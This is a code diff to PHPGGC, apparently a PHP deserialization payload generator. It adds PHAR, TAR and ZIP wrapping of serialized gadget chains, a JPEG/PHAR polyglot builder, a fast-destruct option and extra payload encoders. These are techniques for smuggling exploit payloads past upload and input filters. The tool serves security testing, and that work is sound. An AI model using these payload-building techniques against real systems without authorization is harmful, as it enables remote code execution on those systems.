@@ -274,6 +274,111 @@ class PHPGGC
     }
 
     #
+    # Phar
+    #
+
+    /**
+     * Generates a PHAR file of the correct format (PHAR, TAR, ZIP).
+     */
+    function phar_generate($serialized)
+    {
+        $format = $this->parameters['phar'];
+        
+        $prefix = '';
+        if(isset($this->parameters['phar-prefix']))
+            $prefix = file_get_contents($this->parameters['phar-prefix']);
+        $filename = 'test.txt';
+        if(isset($this->parameters['phar-filename']))
+            $filename = $this->parameters['phar-filename'];
+
+        $class = 'PHPGGC\\Phar\\' . ucfirst($format);
+
+        $phar = new $class($serialized, compact('prefix', 'filename'));
+        $phar->replace_metadata();
+        $phar->update_signature();
+        return $phar->get_data();
+    }
+
+    function pharify($serialized)
+    {
+        if(ini_get('phar.readonly') == '1')
+        {
+            $e = 'Cannot create phar: phar.readonly is set to 1';
+            throw new PHPGGC\Exception($e);
+        }
+
+        $serialized = $this->phar_generate($serialized);
+        
+        if(isset($this->parameters['phar-jpeg']))
+        {
+            $jpeg = file_get_contents($this->parameters['phar-jpeg']);
+            $serialized = $this->generate_polyglot($serialized, $jpeg);
+        }
+        
+        return $serialized;
+    }
+
+    function generate_polyglot($phar, $jpeg)
+    {
+        $phar = substr($phar, 6);
+        $len = strlen($phar);
+        $contents = 
+            substr($jpeg, 0, 2) . "\xff\xfe" . chr(($len >> 8) & 0xff) .
+            chr($len & 0xff) . $phar . substr($jpeg, 2);
+        $contents =
+            substr($contents, 0, 148) .
+            "        " .
+            substr($contents, 156)
+        ;
+    
+        $chksum = 0;
+    
+        for ($i=0;$i<512;$i++)
+        {
+            $chksum += ord(substr($contents, $i, 1));
+        }
+    
+        $oct = sprintf("%07o", $chksum);
+        $contents = substr($contents, 0, 148) . $oct . substr($contents, 155);
+        return $contents;
+    }
+
+    /**
+     * Applies command line filters on the serialized payload.
+     */
+    protected function apply_filters($serialized)
+    {
+        # Enhancements
+        if(in_array('ascii-strings', $this->options))
+            $serialized = \PHPGGC\Enhancements::ascii_strings($serialized);
+        if(in_array('fast-destruct', $this->options))
+            $serialized = \PHPGGC\Enhancements::fast_destruct($serialized);
+
+        if(isset($this->parameters['phar']))
+            $serialized = $this->pharify($serialized);
+
+        foreach($this->options as $v)
+        {
+            switch($v)
+            {
+                case 'base64':
+                    $serialized = base64_encode($serialized);
+                    break;
+                case 'url':
+                    $serialized = urlencode($serialized);
+                    break;
+                case 'soft':
+                    $keys = str_split("%\x00\n\r\t+");
+                    $values = array_map('urlencode', $keys);
+                    $serialized = str_replace($keys, $values, $serialized);
+                    break;
+            }
+        }
+
+        return $serialized;
+    }
+
+    #
     # Display
     #
 
@@ -292,56 +397,6 @@ class PHPGGC
     protected function o($message, $r=1)
     {
         $this->output($message, $r);
-    }
-
-    /**
-     * Applies the fast-destruct technique, so that the object is destroyed
-     * right after the unserialize() call, as opposed to at the end of the
-     * script.
-     *
-     * This is very useful because sometimes the script throws an exception
-     * after unserializing the object, and therefore __destruct() will never be
-     * called.
-     *
-     * The object is put in a 2-item array. Both items have the same key.
-     * Since the object has been put first, it is removed when the second item
-     * is processed (same key). It will therefore be destroyed, and as a result
-     * __destruct() will be called right after the unserialize() call, instead
-     * of at the end of the script.
-     */
-    protected function apply_fast_destruct($serialized)
-    {
-        $key = 7;
-        return sprintf('a:2:{i:%s;%s;i:%s;i:0}', $key, $serialized, $key);
-    }
-
-    /**
-     * Applies command line filters on the serialized payload.
-     */
-    protected function apply_filters($serialized)
-    {
-        foreach($this->options as $v)
-        {
-            switch($v)
-            {
-                case 'fast-destruct':
-                    $serialized = $this->apply_fast_destruct($serialized);
-                    break;
-                case 'base64':
-                    $serialized = base64_encode($serialized);
-                    break;
-                case 'url':
-                    $serialized = urlencode($serialized);
-                    break;
-                case 'soft':
-                    $keys = str_split("%\x00\n\r\t+");
-                    $values = array_map('urlencode', $keys);
-                    $serialized = str_replace($keys, $values, $serialized);
-                    break;
-            }
-        }
-
-        return $serialized;
     }
 
     /**
@@ -414,7 +469,7 @@ class PHPGGC
 
         $this->o("USAGE");
         $this->o("  " . $this->_get_command_line(
-            '[-h|-l|-w|-h|-d|-s|-u|-b|-i]',
+            '[-h|-l|-i|-o|-w]',
             '<GadgetChain>',
             '[arguments]'
         ), 2);
@@ -433,16 +488,34 @@ class PHPGGC
         $this->o("     Specifies a file containing a function: wrapper(\$payload)");
         $this->o("     This function will be called before the generated gadget is serialized.");
         $this->o("");
+        $this->o("PHAR");
+        $this->o("  -p, --phar <tar|zip|phar>");
+        $this->o("     Creates a PHAR file of the given format");
+        $this->o("  -pj, --phar-jpeg <file>");
+        $this->o("     Creates a polyglot JPEG/PHAR file from given image");
+        $this->o("  -pp, --phar-prefix <file>");
+        $this->o("     Sets the PHAR prefix as the contents of the given file.");
+        $this->o("     Generally used with -p phar to control the beginning of the generated file.");
+        $this->o("  -pf, --phar-filename <filename>");
+        $this->o("     Defines the name of the file contained in the generated PHAR (default: test.txt)");
+        $this->o("");
         $this->o("ENHANCEMENTS");
         $this->o("  -f, --fast-destruct");
-        $this->o("     Applies the fast-destruct technique, so that the object");
-        $this->o("     is destroyed right after the unserialize() call, as opposed to at the");
-        $this->o("     end of the script");
+        $this->o("     Applies the fast-destruct technique, so that the object is destroyed");
+        $this->o("     right after the unserialize() call, as opposed to at the end of the");
+        $this->o("     script");
+        $this->o("  -a, --ascii-strings");
+        $this->o("     Uses the 'S' serialization format instead of the standard 's'. This");
+        $this->o("     replaces every non-ASCII value to an hexadecimal representation:");
+        $this->o("     s:5:\"A<null_byte>B<cr><lf>\"; -> S:5:\"A\\00B\\09\\0D\";");
+        $this->o("     This is experimental and it might not work in some cases.");
         $this->o("");
         $this->o("ENCODING");
         $this->o("  -s, --soft   Soft URLencode");
         $this->o("  -u, --url    URLencodes the payload");
         $this->o("  -b, --base64 Converts the output into base64");
+        $this->o("  Encoders can be chained, for instance -b -u -u base64s the payload,");
+        $this->o("  then URLencodes it twice");
         $this->o("");
 
         $this->o("EXAMPLES");
@@ -461,9 +534,12 @@ class PHPGGC
         exit(0);
     }
 
-    function _parse_cmdline_arg($i, &$argv, &$parameters, &$options)
+    function _parse_cmdline_arg(&$i, &$argv, &$parameters, &$options)
     {
         $count = count($argv);
+
+        # Define valid arguments and their abbreviations, which is generally
+        # their first letter
 
         $valid_arguments = [
             'new' => true,
@@ -472,26 +548,52 @@ class PHPGGC
             'list' => false,
             'output' => true,
             'wrapper' => true,
+            # Phar
+            'phar' => true,
+            'phar-jpeg' => true,
+            'phar-prefix' => true,
+            'phar-filename' => true,
+            # Enhancements
             'fast-destruct' => false,
+            'ascii-strings' => false,
+            # Encoders
             'soft' => false,
             'base64' => false,
             'url' => false,
         ];
 
-        $arg = $argv[$i];
-        $arg = substr($arg, 1);
+        $abbreviations = [];
+
+        foreach($valid_arguments as $k => $v)
+        {
+            $abbreviations[$k] = $k{0};
+        }
+
+        $abbreviations = [
+            'phar-jpeg' => 'pj',
+            'phar-prefix' => 'pp',
+            'phar-filename' => 'pf',
+        ] + $abbreviations;
+
+        # If we are in this function, the argument starts with a dash, so we
+        # can safely remove it
+        $arg = substr($argv[$i], 1);
         $valid = false;
+
+        # Find whether given argument is valid and if so, set it as a parameter
+        # or an option
 
         foreach($valid_arguments as $argument => $has_parameter)
         {
             # Check for short and long arguments (-a, --argument)
             if(
-                $argument{0} == $arg ||
-                $arg{0} == '-' && substr($arg, 1) == $argument
+                $arg == $abbreviations[$argument] ||
+                $arg == '-' . $argument
             )
             {
                 $valid = true;
 
+                # Does it expect a parameter ?
                 if($has_parameter)
                 {
                     if($count < $i + 1)
@@ -501,17 +603,12 @@ class PHPGGC
                     }
 
                     $parameters[$argument] = $argv[$i+1];
-                    
-                    # Delete argument's value
-                    unset($argv[$i+1]);
+                    $i++;
                 }
                 else
                 {
                     $options[] = $argument;
                 }
-
-                # Delete argument
-                unset($argv[$i]);
 
                 break;
             }
@@ -528,26 +625,27 @@ class PHPGGC
      */
     protected function parse_cmdline($argv)
     {
-        unset($argv[0]);
-
         # Parameters expect a value, options don't
         $parameters = [];
         $options = [];
+        $arguments = [];
 
-        foreach($argv as $i => $arg)
+        for($i=1;$i<count($argv);$i++)
         {
+            $arg = $argv[$i];
+            # Abort argument parsing
             if($arg == '--')
             {
-                unset($argv[$i]);
+                $arguments += array_slice($argv, $i+1);
                 break;
             }
+            # This is a parameter or an option
             if(strlen($arg) >= 2 && $arg{0} == '-')
-            {
                 $this->_parse_cmdline_arg($i, $argv, $parameters, $options);
-            }
+            # This is a value
+            else
+                $arguments[] = $arg;
         }
-
-        $argv = array_values($argv);
 
         # Handle options and parameters in case they need to be handled now.
 
@@ -574,14 +672,40 @@ class PHPGGC
                     $this->o($this->_get_command_line_gc($gc));
                     return;
                 case 'new':
-                    if(count($argv) < 1)
+                    if(count($arguments) < 1)
                     {
                         $line = $this->_get_command_line('<Framework> <type>');
                         $this->o($line);
                     }
                     else
-                        $this->new_gc($value, $argv[0]);
+                        $this->new_gc($value, $arguments[0]);
                     return;
+                case 'phar':
+                    if(!in_array($value, ['phar', 'tar', 'zip']))
+                    {
+                        $e = '"' . $value . '" is not a valid PHAR format';
+                        throw new PHPGGC\Exception($e);
+                    }
+                    break;
+                case 'phar-jpeg':
+                    if(!isset($parameters['phar']))
+                    {
+                        $parameters['phar'] = 'tar';
+                    }
+                    else if($parameters['phar'] != 'tar')
+                    {
+                        $e = '"--phar-jpeg" implies "--phar tar"';
+                        throw new PHPGGC\Exception($e);
+                    }
+                    # fall through
+                case 'phar-prefix':
+                case 'wrapper':
+                    if(!file_exists($value))
+                    {
+                        $e = $key . ': File "' . $value . '" does not exist';
+                        throw new PHPGGC\Exception($e);
+                    }
+                    break;
             }
         }
 
@@ -591,7 +715,7 @@ class PHPGGC
         $this->parameters = $parameters;
 
         # Return remaining arguments
-        return array_values($argv);
+        return $arguments;
     }
 
     /**
